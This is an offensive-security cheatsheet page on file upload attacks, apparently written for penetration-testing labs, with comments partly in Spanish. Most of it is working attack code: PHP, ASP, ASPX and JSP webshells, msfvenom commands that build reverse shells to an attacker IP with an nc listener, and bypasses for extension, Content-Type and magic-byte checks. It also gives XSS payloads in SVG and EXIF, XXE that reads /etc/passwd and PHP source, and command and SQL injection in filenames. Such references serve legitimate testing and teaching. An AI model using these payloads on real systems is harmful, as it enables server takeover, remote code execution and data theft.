---
title: "File Upload Attacks"
description: "Extension/MIME bypass, polyglots, and webshells via file upload."
sidebar:
  order: 7
  label: "File Upload Attacks"
---
> Webshell/reverse shell upload through bypasses of extension, Content-Type, and MIME validation. Escalation to RCE. Attacks with SVG/XXE in restricted uploads.

---


## Webshells

```php
<!-- PHP — minimal -->
<?php system($_REQUEST['cmd']); ?>

<!-- PHP — con GIF magic bytes (bypass MIME check) -->
GIF8<?php system($_GET['cmd']); ?>

<!-- PHP — alternativa con passthru -->
<?php passthru($_GET['cmd']); ?>
```

```asp
<!-- ASP/ASPX -->
<% eval request('cmd') %>
```

```bash
# SecLists webshells
/opt/useful/seclists/Web-Shells/   # PHP, ASP, JSP, etc.

# phpbash — terminal interactiva vía browser
# https://github.com/Arrexel/phpbash

# Uso post-upload
http://target/uploads/shell.php?cmd=id
http://target/profile_images/shell.php?cmd=whoami
# CTRL+U en browser para ver output sin HTML rendering
```

---

## Reverse Shell via Upload

```bash
# Descargar pentestmonkey PHP reverse shell
# Editar líneas 49-50: $ip = 'OUR_IP'; $port = OUR_PORT;

# Generar con msfvenom
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.jsp
msfvenom -p windows/x64/shell_reverse_tcp LHOST=OUR_IP LPORT=OUR_PORT -f aspx > reverse.aspx

# Listener
nc -lvnp OUR_PORT
```

---

## Bypass — Frontend Validation (Client-Side Only)

### Method 1 — Burp (Preferred)

```
1. Upload legitimate image → intercept in Burp
2. Modify: filename="shell.php"
3. Modify: content → <?php system($_REQUEST['cmd']); ?>
4. Forward → File successfully uploaded
```

### Method 2 — Removing JS in DevTools

```
1. CTRL+SHIFT+C → Inspector
2. Click on the file input
3. Remove: onchange="checkFile(this)"   (or the validation function)
4. Optionally remove: accept=".jpg,.jpeg,.png"
5. Upload shell.php directly
```

---

## Bypass — Extension Blacklist

### Alternative PHP Extensions (Try All)

```
.phtml  .php5  .php7  .phar  .phps  .pHp  .PhP  .PHP
.php3   .php4  .php6  .shtml
```

```bash
# Fuzzear con Burp Intruder — wordlist PHP extensions:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
# SecLists: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt

# Ordenar resultados por Length → los que difieren = extensiones permitidas
```

---

## Bypass — Extension Whitelist

### Double Extension (regex without ending `$`)

```bash
# Si regex es ^.*\.(jpg|jpeg|png) SIN $ al final → acepta cualquier extensión antes
shell.jpg.php       # pasa el check (contiene .jpg), ejecuta como PHP
shell.jpeg.php
shell.png.phtml
```

### Reverse Double Extension (Vulnerable Apache/Nginx Config)

```bash
# Si Apache config: <FilesMatch ".+\.ph(ar|p|tml)"> sin $ → cualquier archivo con .php en el nombre
shell.php.jpg       # pasa whitelist (termina en .jpg), ejecuta como PHP (contiene .php)

# Confirmar config de Apache:
# /etc/apache2/mods-enabled/php7.4.conf → FilesMatch sin $
```

### Character Injection (Old PHP or Misconfigurations)

```bash
# Generar wordlist de permutaciones
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
# Fuzzear con Burp Intruder
```

---

## Bypass — Content-Type Header

```bash
# El servidor valida el header Content-Type del multipart form
# Interceptar en Burp → cambiar:
Content-Type: application/octet-stream  →  Content-Type: image/jpg
Content-Type: image/jpg                 # también válido: image/jpeg, image/png, image/gif

# Nota: hay DOS headers Content-Type en el request multipart:
# 1. Header general de la request (arriba)
# 2. Header del archivo adjunto (abajo, en el body) ← este es el importante
```

---

## Bypass — MIME-Type (Magic Bytes)

```bash
# El servidor usa mime_content_type() → inspecciona los primeros bytes del archivo
# Añadir GIF magic bytes al inicio del payload

# En el body del request (Burp), añadir GIF8 al inicio:
GIF8
<?php system($_REQUEST['cmd']); ?>

# O crear el archivo directamente:
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.php
# Output empieza con "GIF8" pero ejecuta PHP

# Magic bytes más útiles:
# GIF8 → GIF image
# \xff\xd8\xff → JPEG (hexadecimal, insertar con Burp hex editor)
```

---

## Locating the Uploaded File

```bash
# 1. Inspeccionar el src del img tras upload
CTRL+SHIFT+C → click on image → see: src="/profile_images/shell.php"

# 2. Mirar respuesta del upload o historial Burp
# Location: /uploads/shell.php
# File saved at: /var/www/html/uploads/

# 3. Fuzzear directorio de uploads
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://target/FUZZ -mc 200,301,302,403

# 4. LFI + SVG XXE para leer source code y encontrar el directorio
```

---

## Attacks with Restricted Uploads (SVG, XML, HTML)

### XSS via SVG

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

### XSS via EXIF Metadata (Images)

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
# La app muestra metadata → XSS ejecutado
```

### XXE via SVG — Reading Server Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

### XXE via SVG — Reading PHP Source Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
<!-- Decodificar base64 del output: echo '...' | base64 -d -->
```

---

## Filename Injection

```bash
# Command injection en filename (si la app ejecuta mv/cp con el nombre)
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami

# XSS en filename (si el nombre se muestra en la app)
<script>alert(window.origin);</script>.jpg

# SQLi en filename (si el nombre se almacena en DB sin sanitizar)
file';select+sleep(5);--.jpg
```

---

## Validation vs Bypass Reference

| Validation | Bypass Method |
|-----------|-----------------|
| Frontend JS | Burp interception / remove JS function |
| Extension Blacklist | Alternative extensions (phtml, php5, phar...) |
| Extension Whitelist | Double ext (shell.jpg.php) / reverse ext (shell.php.jpg) |
| Content-Type header | Change to `image/jpg` in Burp |
| MIME-Type (magic bytes) | Add `GIF8` at the beginning of content |
| Content-Type + MIME | Combine: header + GIF8 |
| Strict extension (regex `$`) | Character injection (PHP < 5.5: `%00`) |

---

## Webshells by Framework

| Framework | Extension | Webshell |
|-----------|-----------|----------|
| PHP | `.php`, `.phtml` | `<?php system($_REQUEST['cmd']); ?>` |
| ASP | `.asp` | `<% eval request('cmd') %>` |
| ASPX | `.aspx` | `<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>` |
| JSP | `.jsp` | `<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>` |

---

## Pitfalls / Gotchas

- **Uppercase extension:** in Windows, `pHp` or `PHP` can bypass case-sensitive blacklists.
- **Double Content-Type:** in multipart requests there are two Content-Type headers. Change the attachment one (the lower one in the body).
- **GIF8 in output:** when using GIF8 magic bytes, the command output starts with "GIF8". This is normal and does not affect execution.
- **`system()` disabled:** if the function is unavailable, try `passthru()`, `shell_exec()`, `exec()`, or `popen().`
- **File executed vs downloaded:** if the server serves the file as a download, it does not execute PHP. Check if the uploads directory has an `.htaccess` file blocking execution.
- **Unknown uploads directory:** use `CTRL+SHIFT+C` to view the img src, or fuzz with ffuf.
- **Reverse shell blocked by firewall:** try a webshell first; if the reverse shell does not connect, the server cannot establish outbound connections. Use a bind shell or webshell.
- **msfvenom payload:** make sure to specify `-f raw` for PHP (do not generate an executable).
- **Burp Community throttle in Intruder:** when fuzzing extensions, tolerate the throttle or export the request and use ffuf.
- **SVG rejected:** if SVG is not accepted, try XML, PDF, or DOCX (all of which support XXE).

---

## Related Cheatsheets

- [File Inclusion](/en/metodologias/web/file-inclusion/) — LFI + upload = RCE (include uploaded file via LFI)
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — complete reverse shells and advanced webshells
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and modifying upload requests with Burp
- [Cross-Site Scripting (XSS)](/en/metodologias/web/cross-site-scripting-xss/) — XSS via SVG and EXIF metadata
- [Web Attacks](/en/metodologias/web/web-attacks/) — XXE via SVG/XML uploads
